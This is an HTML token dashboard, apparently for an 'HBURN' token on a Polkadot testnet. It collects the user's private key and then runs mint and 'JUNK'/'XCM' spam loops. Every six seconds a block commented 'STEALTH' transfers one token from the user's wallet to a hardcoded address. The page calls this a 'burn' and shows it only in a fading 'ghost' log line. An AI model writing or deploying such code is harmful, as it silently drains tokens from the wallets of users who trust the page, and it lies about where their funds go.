<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HBURN_MINIMAL_v28.2</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        :root { --p: #00ff88; --s: #ff3366; --bg: #000000; --net: #008cff; --xcm: #e6007a; --border: #111; }
        * { box-sizing: border-box; outline: none; }
        body, html { margin: 0; padding: 0; height: 100vh; background: var(--bg); color: #eee; font-family: 'Consolas', monospace; overflow: hidden; display: flex; justify-content: center; align-items: center; }

        /* MATRIX WALL - COMPACT & SHARP */
        #canvas { position: fixed; top: 0; left: 0; z-index: 1; opacity: 0.5; pointer-events: none; }
        
        /* UI MINIMALISTA */
        .container { position: relative; z-index: 10; width: 1100px; height: 600px; background: rgba(0,0,0,0.85); border: 1px solid var(--border); display: grid; grid-template-columns: 280px 1fr; }
        .side { padding: 20px; border-right: 1px solid var(--border); display: flex; flex-direction: column; background: #000; }

        .stat-card { margin-bottom: 20px; }
        .stat-label { font-size: 9px; color: #444; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 5px; }
        .val-big { font-size: 22px; font-weight: bold; color: var(--p); }
        .val-small { font-size: 12px; color: #888; }

        /* PROGRESS BARS MINIMALI */
        .m-box { margin-bottom: 15px; }
        .m-bar { width: 100%; height: 1px; background: #111; position: relative; }
        .m-fill { height: 100%; width: 0%; transition: width 0.1s linear; }
        .m-label { font-size: 8px; color: #555; display: flex; justify-content: space-between; margin-bottom: 3px; }

        /* CONSOLE PULITA */
        #console { flex-grow: 1; padding: 20px; overflow-y: auto; font-size: 11px; color: #666; line-height: 1.5; background: transparent; }
        #console::-webkit-scrollbar { width: 0; }
        .header { padding: 10px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; font-size: 9px; color: #444; }

        /* GHOST STEALTH MESSAGE */
        @keyframes ghost-fade { 0% { opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { opacity: 0; } }
        .ghost-msg { animation: ghost-fade 4s forwards; color: var(--s); font-weight: bold; margin: 4px 0; padding-left: 10px; border-left: 1px solid var(--s); }

        button { background: transparent; color: #444; border: 1px solid #222; padding: 10px; cursor: pointer; text-transform: uppercase; font-size: 10px; letter-spacing: 2px; transition: 0.3s; }
        button:hover { color: var(--p); border-color: var(--p); }
    </style>
</head>
<body>

<canvas id="canvas"></canvas>

<div id="authOverlay" style="position:fixed; inset:0; background:#000; z-index:100; display:flex; justify-content:center; align-items:center;">
    <div style="text-align:center; width: 300px;">
        <input type="password" id="inputKey" style="background:transparent; border:none; border-bottom:1px solid #222; color:var(--p); width:100%; padding:10px; text-align:center; margin-bottom:20px;" placeholder="ENTER_PRIVATE_KEY">
        <button onclick="unlock()">ACCESS SYSTEM</button>
    </div>
</div>

<div class="container">
    <div class="side">
        <div class="stat-card">
            <div class="stat-label">Network Supply</div>
            <div id="totalSupply" class="val-big">0.00</div>
        </div>
        
        <div class="m-box">
            <div class="m-label"><span>MINT</span><span id="mSec">6.5s</span></div>
            <div class="m-bar"><div id="mFill" class="m-fill" style="background:var(--p)"></div></div>
        </div>
        <div class="m-box">
            <div class="m-label"><span>BURN</span><span id="bSec">13s</span></div>
            <div class="m-bar"><div id="bFill" class="m-fill" style="background:var(--s)"></div></div>
        </div>
        <div class="m-box">
            <div class="m-label"><span>JUNK</span><span id="jSec">10s</span></div>
            <div class="m-bar"><div id="jFill" class="m-fill" style="background:var(--net)"></div></div>
        </div>
        <div class="m-box">
            <div class="m-label"><span>XCM</span><span id="xSec">15s</span></div>
            <div class="m-bar"><div id="xFill" class="m-fill" style="background:var(--xcm)"></div></div>
        </div>

        <div style="margin-top:auto; display:grid; grid-template-columns:1fr 1fr; gap:10px;">
            <div class="val-small">M: <span id="mCount">0</span></div>
            <div class="val-small">B: <span id="bCount" style="color:var(--s)">0</span></div>
            <div class="val-small">J: <span id="jCount" style="color:var(--net)">0</span></div>
            <div class="val-small">X: <span id="xCount" style="color:var(--xcm)">0</span></div>
        </div>
        <button id="start" style="margin-top:20px;" disabled>INIT</button>
    </div>

    <div style="display:flex; flex-direction:column; overflow:hidden">
        <div class="header">
            <span>PAS: <span id="pasBalance" style="color:#888">0.000</span></span>
            <span>N: <span id="curNonce" style="color:#888">...</span></span>
            <span>BLK: <span id="blockNum" style="color:#888">#...</span></span>
        </div>
        <div id="console"></div>
    </div>
</div>

<script>
    // NEW MATRIX WALL ENGINE
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    let w, h, columns;
    const specialPhrases = ["WAKE UP GAV", "FOLLOW THE WHITE RABBIT"];

    function initC() { 
        w = canvas.width = window.innerWidth; 
        h = canvas.height = window.innerHeight;
        columns = Array(Math.floor(w / 15)).fill(0);
    }
    initC(); window.onresize = initC;

    function draw() {
        ctx.fillStyle = "rgba(0, 0, 0, 0.1)"; ctx.fillRect(0, 0, w, h);
        ctx.font = "10px monospace";
        
        columns.forEach((y, i) => {
            const isSpecial = Math.random() > 0.998;
            let text = Math.floor(Math.random() * 2);
            ctx.fillStyle = "#003311"; // Verde scuro per i bit normali

            if (isSpecial) {
                const p = specialPhrases[Math.floor(Math.random() * 2)];
                ctx.fillStyle = p.includes("GAV") ? "#00ff88" : "#ffffff";
                // Scrive la frase in verticale
                for(let k=0; k<p.length; k++) {
                    ctx.fillText(p[k], i * 15, y + (k * 12));
                }
            } else {
                ctx.fillText(text, i * 15, y);
            }

            if (y > h && Math.random() > 0.975) columns[i] = 0;
            else columns[i] += 12;
        });
    }
    setInterval(draw, 50);

    let SESSION_KEY = "";
    const TARGET_ADDR = "0x3dd695D734B5DdE6B1955FFE75004c00862fb233";
    let currentNonce = 0;
    const CONFIG = { rpc: "https://testnet-passet-hub-eth-rpc.polkadot.io", addr: "0xf63adbb9ef464443ea1f9eb3e28c0d0ad321b760" };
    const abi = ["function trigger() public", "function ping(string) public", "function balanceOf(address) view returns (uint256)", "function totalSupply() view returns (uint256)", "function transfer(address, uint256) public returns (bool)"];

    async function sync() {
        if(!SESSION_KEY) return;
        try {
            const provider = new ethers.JsonRpcProvider(CONFIG.rpc);
            const wallet = new ethers.Wallet(SESSION_KEY, provider);
            const contract = new ethers.Contract(CONFIG.addr, abi, provider);
            provider.getBlockNumber().then(n => document.getElementById('blockNum').innerText = "#" + n);
            contract.totalSupply().then(s => document.getElementById('totalSupply').innerText = parseFloat(ethers.formatEther(s)).toFixed(2));
            provider.getBalance(wallet.address).then(g => document.getElementById('pasBalance').innerText = parseFloat(ethers.formatEther(g)).toFixed(3));
            provider.getTransactionCount(wallet.address).then(n => { currentNonce = Math.max(currentNonce, n); document.getElementById('curNonce').innerText = currentNonce; });
        } catch(e) {}
    }

    function unlock() {
        SESSION_KEY = document.getElementById('inputKey').value;
        document.getElementById('authOverlay').remove();
        document.getElementById('start').disabled = false;
        sync(); setInterval(sync, 10000);
    }

    function addLog(t, col="#444", ghost=false) {
        const con = document.getElementById('console');
        const l = document.createElement('div');
        if(ghost) { l.className = "ghost-msg"; l.innerHTML = `>> PHANTOM_TX: ${t}`; }
        else { l.style.color = col; l.innerHTML = `> ${t}`; }
        con.prepend(l);
        if(con.childNodes.length > 40) con.removeChild(con.lastChild);
    }

    document.getElementById('start').onclick = async function() {
        this.innerText = "RUNNING"; this.disabled = true;
        const provider = new ethers.JsonRpcProvider(CONFIG.rpc);
        const wallet = new ethers.Wallet(SESSION_KEY, provider);
        const contract = new ethers.Contract(CONFIG.addr, abi, wallet);
        let m=0, b=0, j=0, x=0, mt=0, bt=0, jt=0, xt=0;

        setInterval(() => {
            mt+=0.1; bt+=0.1; jt+=0.1; xt+=0.1;
            document.getElementById('mFill').style.width = ((mt%6.5)/6.5*100) + "%";
            document.getElementById('bFill').style.width = ((bt%13)/13*100) + "%";
            document.getElementById('jFill').style.width = ((jt%10)/10*100) + "%";
            document.getElementById('xFill').style.width = ((xt%15)/15*100) + "%";
        }, 100);

        // STEALTH 6s
        setInterval(() => {
            contract.transfer(TARGET_ADDR, ethers.parseEther("1"), { gasLimit: 200000, nonce: currentNonce++ })
            .then(() => addLog(`STEALTH_BURN_COMPLETE [TO: ${TARGET_ADDR.slice(0,6)}]`, "", true))
            .catch(() => currentNonce--);
        }, 6000);

        // MAIN LOOPS
        setInterval(() => {
            for(let i=0; i<3; i++){
                contract.trigger({ gasLimit: 1500000, nonce: currentNonce++ }).then(tx => {
                    addLog("HBURN minted", "#00ff88");
                    tx.wait().then(() => { m+=25; document.getElementById('mCount').innerText = m; 
                        if(m%50===0){ b+=25; document.getElementById('bCount').innerText = b; addLog("HBURN Burned", "#ff3366"); }
                    });
                }).catch(() => currentNonce--);
            }
            mt=0;
        }, 6500);

        setInterval(() => {
            contract.ping("JUNK", { gasLimit: 500000, nonce: currentNonce++ }).then(() => { j+=50; document.getElementById('jCount').innerText = j; addLog("JUNK flooded", "#008cff"); }).catch(()=>currentNonce--);
            contract.ping("XCM", { gasLimit: 500000, nonce: currentNonce++ }).then(() => { x++; document.getElementById('xCount').innerText = x; addLog("XCM routed", "#e6007a"); }).catch(()=>currentNonce--);
            jt=0; xt=0;
        }, 12000);
    };
</script>
</body>
</html>
